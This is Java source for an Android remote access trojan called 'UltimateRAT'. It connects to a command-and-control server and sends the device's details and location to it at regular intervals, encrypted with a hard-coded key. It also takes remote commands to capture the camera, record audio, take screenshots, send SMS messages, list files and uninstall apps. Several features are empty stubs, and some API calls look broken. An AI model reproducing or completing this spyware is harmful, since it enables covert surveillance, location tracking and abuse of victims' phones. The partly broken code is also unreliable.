package com.ultimaterat.client;

import android.app.*;
import android.content.*;
import android.location.*;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.util.*;
import android.widget.*;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;
import io.socket.client.IO;
import io.socket.client.Socket;

import java.io.*;
import java.net.*;
import java.security.SecureRandom;
import java.util.*;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class RATService extends Service {
    private static final String TAG = "UltimateRAT";
    private Socket socket;
    private String sessionId;
    private String c2Server;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private byte[] encryptionKey = "0123456789abcdef".getBytes(); // 16 bytes for AES

    @Override
    public void onCreate() {
        super.onCreate();
        sessionId = generateSessionId();
        startForeground(1, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        c2Server = intent.getStringExtra("c2_server");
        new Thread(this::connectToC2).start();
        return START_STICKY;
    }

    private void connectToC2() {
        try {
            Options options = new Options().setTransports(Transport.WEBSOCKET);
            socket = IO.socket(c2Server, options);

            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected to C2");
                sendDeviceInfo();
                startHeartbeat();
                startKeylogger();
                startLocationTracking();
            });

            socket.on("camera:capture", args -> {
                JSONObject data = (JSONObject) args[0];
                captureCamera(data.optString("camera", "back"));
            });

            socket.on("mic:record", args -> recordAudio());
            socket.on("screen:screenshot", args -> captureScreen());
            socket.on("sms:send", args -> {
                JSONObject data = (JSONObject) args[0];
                sendSMS(data.optString("number"), data.optString("message"));
            });
            socket.on("file:list", args -> listFiles());
            socket.on("app:uninstall", args -> {
                JSONObject data = (JSONObject) args[0];
                uninstallApp(data.optString("package"));
            });

            socket.connect();
        } catch (Exception e) {
            Log.e(TAG, "C2 Connection Error: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("sessionId", sessionId);
            deviceInfo.put("deviceName", Build.MODEL);
            deviceInfo.put("platform", "android");
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("osVersion", Build.VERSION.RELEASE);
            deviceInfo.put("ipAddress", getLocalIPAddress());
            deviceInfo.put("country", "Unknown");
            deviceInfo.put("isRooted", isRooted());
            deviceInfo.put("encryptionKey", encrypt(sessionId));

            socket.emit("device:register", encrypt(deviceInfo.toString()));
        } catch (Exception e) {
            Log.e(TAG, "Error sending device info: " + e);
        }
    }

    private void startHeartbeat() {
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(30000);
                    JSONObject heartbeat = new JSONObject();
                    heartbeat.put("sessionId", sessionId);
                    heartbeat.put("batteryLevel", getBatteryLevel());
                    heartbeat.put("isCharging", isCharging());
                    heartbeat.put("latitude", getLastLocation().latitude);
                    heartbeat.put("longitude", getLastLocation().longitude);
                    socket.emit("device:heartbeat", encrypt(heartbeat.toString()));
                } catch (Exception e) {
                    Log.e(TAG, "Heartbeat error: " + e);
                }
            }
        }).start();
    }

    private void startKeylogger() {
        // Simplified keylogger using Accessibility Service
        // Full implementation needs AccessibilityService class
    }

    private void startLocationTracking() {
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(60000);
                    Location loc = getLastLocation();
                    JSONObject locData = new JSONObject();
                    locData.put("sessionId", sessionId);
                    locData.put("latitude", loc.latitude);
                    locData.put("longitude", loc.longitude);
                    socket.emit("location:update", encrypt(locData.toString()));
                } catch (Exception e) {
                    Log.e(TAG, "Location error: " + e);
                }
            }
        }).start();
    }

    private void captureCamera(String camera) {
        new Thread(() -> {
            try {
                // Camera capture logic here
                // Save image and send to server
                socket.emit("screenshot:upload", encrypt("{\"camera\":\"" + camera + "\"}"));
            } catch (Exception e) {
                Log.e(TAG, "Camera error: " + e);
            }
        }).start();
    }

    private void recordAudio() {
        new Thread(() -> {
            try {
                // Audio recording logic
            } catch (Exception e) {
                Log.e(TAG, "Audio error: " + e);
            }
        }).start();
    }

    private void captureScreen() {
        new Thread(() -> {
            try {
                // Screen capture using MediaProjection
            } catch (Exception e) {
                Log.e(TAG, "Screen capture error: " + e);
            }
        }).start();
    }

    private void sendSMS(String number, String message) {
        new Thread(() -> {
            try {
                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(number, null, message, null, null);
            } catch (Exception e) {
                Log.e(TAG, "SMS error: " + e);
            }
        }).start();
    }

    private void listFiles() {
        new Thread(() -> {
            try {
                File root = new File("/sdcard");
                File[] files = root.listFiles();
                if (files != null) {
                    StringBuilder fileList = new StringBuilder();
                    for (File f : files) {
                        fileList.append(f.getName()).append(",");
                    }
                    socket.emit("file:list", encrypt("{\"files\":\"" + fileList + "\"}"));
                }
            } catch (Exception e) {
                Log.e(TAG, "File list error: " + e);
            }
        }).start();
    }

    private void uninstallApp(String packageName) {
        try {
            Uri packageURI = Uri.parse("package:" + packageName);
            Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
            startActivity(uninstallIntent);
        } catch (Exception e) {
            Log.e(TAG, "Uninstall error: " + e);
        }
    }

    private Location getLastLocation() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        try {
            List<String> providers = lm.getProviders(true);
            Location bestLocation = null;
            for (String provider : providers) {
                Location l = lm.getLastLocation(provider);
                if (l == null || l.getTime() == 0) continue;
                if (bestLocation == null || l.getAccuracy() < bestLocation.getAccuracy()) {
                    bestLocation = l;
                }
            }
            return bestLocation != null ? bestLocation : new Location("network");
        } catch (Exception e) {
            return new Location("network");
        }
    }

    private int getBatteryLevel() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            return (int) (level * 100 / scale);
        }
        return 0;
    }

    private boolean isCharging() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);
        if (batteryStatus != null) {
            return batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) > 0;
        }
        return false;
    }

    private boolean isRooted() {
        return rootDetection();
    }

    private String getLocalIPAddress() {
        try {
            for (Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces(); interfaces.hasMoreElements(); ) {
                NetworkInterface iface = interfaces.nextElement();
                for (Enumeration<InetAddress> inetAddresses = iface.getInetAddresses(); inetAddresses.hasMoreElements(); ) {
                    InetAddress inetAddr = inetAddresses.nextElement();
                    if (!inetAddr.isLoopbackAddress() && inetAddr instanceof Inet4Address) {
                        return inetAddr.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "IP error: " + e);
        }
        return "0.0.0.0";
    }

    private String generateSessionId() {
        SecureRandom random = new SecureRandom();
        byte[] bytes = new byte[16];
        random.nextBytes(bytes);
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    private String encrypt(String data) {
        try {
            SecretKeySpec key = new SecretKeySpec(encryptionKey, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key);
            byte[] encrypted = cipher.doFinal(data.getBytes());
            return Base64.encodeToString(encrypted, Base64.DEFAULT);
        } catch (Exception e) {
            return data;
        }
    }

    private boolean rootDetection() {
        String[] paths = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su"};
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }
        try {
            Process process = Runtime.getRuntime().exec("su -l");
            if (process != null) return true;
        } catch (Exception e) {
            return false;
        }
        return false;
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, "rat_channel")
            .setContentTitle("Ultimate RAT")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .build();
    }

    @Override
    public void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}